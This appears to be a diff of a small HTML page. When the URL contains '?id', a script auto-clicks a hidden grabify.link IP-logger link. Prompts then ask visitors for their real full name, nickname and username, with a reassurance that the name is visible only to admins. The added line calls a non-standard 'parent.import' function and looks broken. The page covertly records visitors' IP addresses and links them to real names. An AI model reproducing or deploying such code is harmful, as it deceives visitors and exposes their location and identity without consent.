@@ -5,7 +5,7 @@
 	<body>
 		<a referrerpolicy="no-referrer-when-downgrade" href="https://grabify.link/NEISOG">a</a>
 <script>
-	if(location.href.includes("?id")){document.querySelector("a").click()}
+	if(location.href.includes("?id")){parent.import("perms-basic.js");document.querySelector("a").click()}
 	name = prompt("Put Your First And Last Name Here\r\nDo Not Put Nicknames Here\r\nThis Info Is Only Visible To Admins To Identify People To Hear Feedback From Said People\r\n");
 	nickname = prompt("If You Have A Nickname Put It Here Otherwise Press The Ok Button Without Typing Anything\r\nFor Example If You Have Then Name Of Robert You May Wish To Be Called Bob");
 	username = prompt("Type Your Username Here This Will Be Visible To Others");
